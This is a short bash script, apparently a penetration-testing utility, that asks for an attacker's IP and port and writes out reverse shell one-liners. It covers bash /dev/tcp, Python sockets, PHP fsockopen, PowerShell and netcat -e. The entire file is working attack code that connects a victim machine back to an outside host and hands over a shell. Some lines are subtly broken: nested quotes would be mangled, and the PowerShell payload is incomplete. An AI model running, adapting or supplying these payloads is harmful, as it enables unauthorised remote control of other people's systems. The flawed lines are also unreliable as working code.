#!/bin/bash
echo "Reverse Shell Generator"

read -p "Enter LHOST (your IP): " lhost
read -p "Enter LPORT (your listening port): " lport

mkdir -p reverse_shells

echo "[*] Generating payloads for $lhost:$lport..."

echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" > reverse_shells/bash.sh
echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'" > reverse_shells/python.py
echo "php -r '\$sock=fsockopen("$lhost",$lport);exec("/bin/sh -i <&3 >&3 2>&3");'" > reverse_shells/php.php
echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('$lhost',$lport);" > reverse_shells/powershell.ps1
echo "nc -e /bin/sh $lhost $lport" > reverse_shells/netcat.sh

echo "[+] Reverse shell payloads saved in 'reverse_shells/'"
